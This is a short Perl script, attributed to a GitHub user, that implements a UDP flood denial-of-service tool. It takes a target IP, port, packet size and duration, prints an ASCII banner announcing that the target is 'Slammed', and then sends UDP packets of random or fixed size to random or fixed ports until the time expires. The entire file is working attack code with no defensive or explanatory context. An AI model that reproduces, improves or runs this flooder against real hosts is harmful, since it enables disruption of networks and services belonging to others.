#By DeaKenas / Github.com 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Failed to slam $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD CYAN<<EOTEXT;

EOTEXT

print " ██ ▄█▀▓█████  ███▄    █  ▒█████    ██████ 
 ██▄█▒ ▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▒██    ▒ 
▓███▄░ ▒███   ▓██  ▀█ ██▒▒██░  ██▒░ ▓██▄   
▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░  ▒   ██▒
▒██▒ █▄░▒████▒▒██░   ▓██░░ ████▓▒░▒██████▒▒
▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░
░ ░░ ░    ░      ░   ░ ░ ░ ░ ░ ▒  ░  ░  ░  
░  ░      ░  ░         ░     ░ ░        ░  
    KEN0S Slammed $ip " . ($port ? $port : " On rndom ports") . "  " . 
  ($size ? "$size-Slammed" : " PPS: 65500") . " Data: 63kbps" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
